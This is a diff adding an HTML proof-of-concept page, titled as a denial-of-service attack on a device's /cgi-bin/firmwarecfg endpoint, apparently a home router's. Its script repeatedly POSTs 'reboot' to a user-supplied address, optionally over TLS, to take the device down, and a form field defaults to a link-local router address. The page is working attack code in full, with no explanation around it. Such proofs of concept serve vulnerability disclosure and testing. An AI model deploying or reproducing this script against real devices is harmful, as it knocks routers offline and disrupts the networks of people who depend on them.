@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>DoS attack to firmwarecfg PoC</title>
+	<link rel="stylesheet" href="poc.css">
+	<script language="javascript">
+		function nextRequest(i, count, address, tls, tlsport)
+		{
+			var xhr = startRequest(address, tls, tlsport);
+			window.setTimeout(getXhrState, (tls ? 3000 : 250), xhr, i, count, address, tls, tlsport);
+		}
+		function getXhrState(xhr, i, count, address, tls, tlsport)
+		{
+			var log = document.getElementById("log");
+			i++;
+			log.innerHTML += "<br />Sent request " + i + " ==> " + xhr.readyState;
+			if (i >= count) return;
+			window.setTimeout(nextRequest, 250, i, count, address, tls, tlsport);
+		}
+		function startRequest(address, tls, tlsport)
+		{
+			var xhr = new XMLHttpRequest();
+			var url = "http" + (tls ? "s" : "") + "://" + address + (tls ? ":" + tlsport : "") + "/cgi-bin/firmwarecfg";
+			xhr.open("POST", url, true);
+			xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+			xhr.timeout = (tls ? 5000 : 500);
+			xhr.send("reboot");
+			return xhr;
+		}
+		function doRequests()
+		{
+			var log = document.getElementById("log");
+			var address = document.getElementById("ipAddress").value;
+			var tls = document.getElementById("tls").checked;
+			var port = document.getElementById("tlsport").value;
+			var count = document.getElementById("requests").value;
+			var i = 0;
+			log.innerHTML += "<br />Sending " + count + " requests with" + (tls ? "" : "out") + " TLS to " + address + (tls ? ":" + port : "");
+			window.setTimeout(nextRequest, 1, i, count, address, tls, port);
+		}
+	</script>
+</head>
+<body>
+	<table>
+		<tr>
+			<td>
+				IP address of device to take down
+			</td>
+			<td>
+				<input type="text" id="ipAddress" value="169.254.1.1" size="16" />
+			</td>
+		</tr>
+		<tr>
+			<td>
+				number of requests to send
+			</td>
+			<td>
+				<input type="text" id="requests" value="1" size="3" />
+			</td>
+		</tr>
+		<tr>
+			<td>
+				use TLS for requests/TLS port
+			</td>
+			<td>
+				<input type="checkbox" id="tls" />
+				<input type="text" id="tlsport" value="443" size="4" />
+			</td>
+		</tr>
+		<tr>
+			<td>
+				&nbsp;
+			</td>
+			<td>
+				<input type="button" onclick="doRequests();" value="Let's get ready to rumble ..." />
+			</td>
+		</tr>
+	</table>
+	<div id="log">
+	</div>
+</body>
+</html>
